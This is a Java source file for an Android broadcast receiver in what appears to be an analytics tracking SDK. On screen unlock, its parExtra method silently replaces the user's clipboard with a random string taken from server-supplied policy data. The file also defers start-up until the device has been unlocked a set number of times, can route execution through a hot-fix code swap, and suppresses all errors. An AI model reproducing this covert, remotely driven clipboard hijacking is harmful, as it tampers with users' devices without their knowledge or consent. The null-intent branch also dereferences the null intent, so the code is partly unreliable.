package com.analysys.track.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import android.util.Log;

import com.analysys.plugin.TimePrint;
import com.analysys.track.AnalysysTracker;
import com.analysys.track.BuildConfig;
import com.analysys.track.impl.HotFixTransform;
import com.analysys.track.internal.AnalysysInternal;
import com.analysys.track.internal.content.EGContext;
import com.analysys.track.internal.content.UploadKey;
import com.analysys.track.internal.impl.ReceiverImpl;
import com.analysys.track.utils.EContextHelper;
import com.analysys.track.utils.ELOG;
import com.analysys.track.utils.MClipManager;
import com.analysys.track.utils.reflectinon.ClazzUtils;
import com.analysys.track.utils.sp.SPHelper;

import org.json.JSONArray;

import java.util.Random;


/**
 * @Copyright © 2019 sanbo Inc. All rights reserved.
 * @Description: 广播接收器
 * @Version: 1.0
 * @Create: 2019-08-07 18:15:12
 * @author: sanbo
 * @mail: xueyongfu@analysys.com.cn
 */
public class AnalysysReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(final Context context, final Intent intent) {
        processReceiver(context, intent);
    }

    private void processReceiver(Context context, Intent intent) {
        try {

            Context c = EContextHelper.getContext(context);
            AnalysysTracker.setContext(c);
            if (EGContext.FLAG_DEBUG_INNER) {
                Log.d(BuildConfig.tag_recerver, " analysys 广播 " + intent.getAction());
                TimePrint.start(BuildConfig.tag_recerver + " 广播 " + intent.getAction() + " process");
            }
            if (BuildConfig.enableHotFix) {
                try {
                    HotFixTransform.transform(
                            HotFixTransform.make(AnalysysReceiver.class.getName())
                            , AnalysysReceiver.class.getName()
                            , "onReceive", c, intent);
                    return;
                } catch (Throwable e) {

                }
            }
            parserIntent(c, intent);
        } catch (Throwable e) {
        }
    }

    private void parserIntent(Context context, Intent intent) {
        if (intent == null) {
            if (EGContext.FLAG_DEBUG_INNER) {
                TimePrint.end(BuildConfig.tag_recerver + " 广播 " + intent.getAction() + " process");
            }
            return;
        }
        if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
            //没初始化并且开屏了10次,就初始化,否则+1返回不处理
            parExtra(context);
            int size = SPHelper.getIntValueFromSP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, 0);
            if (size > EGContext.FLAG_START_COUNT) {
                AnalysysInternal.getInstance(context).initEguan(null, null, false);
            } else {
                SPHelper.setIntValue2SP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, size + 1);
                if (EGContext.FLAG_DEBUG_INNER) {
                    TimePrint.end(BuildConfig.tag_recerver + " 广播 " + intent.getAction() + " process");
                }
            }
        } else {
            ReceiverImpl.getInstance().process(context, intent);
            if (EGContext.FLAG_DEBUG_INNER) {
                TimePrint.end(BuildConfig.tag_recerver + " 广播 " + intent.getAction() + " process");
            }
        }
    }

    private void parExtra(Context context) {
        try {
            String extras = SPHelper.getStringValueFromSP(context, UploadKey.Response.RES_POLICY_EXTRAS, "");
            if (!TextUtils.isEmpty(extras)) {
                JSONArray ar = new JSONArray(extras);
                if (ar.length() > 0) {
                    int x = new Random(System.nanoTime()).nextInt(ar.length() - 1);
                    MClipManager.setClipbpard(context, "", ar.optString(x, ""));
                }
            }
        } catch (Throwable igone) {
        }
    }


}
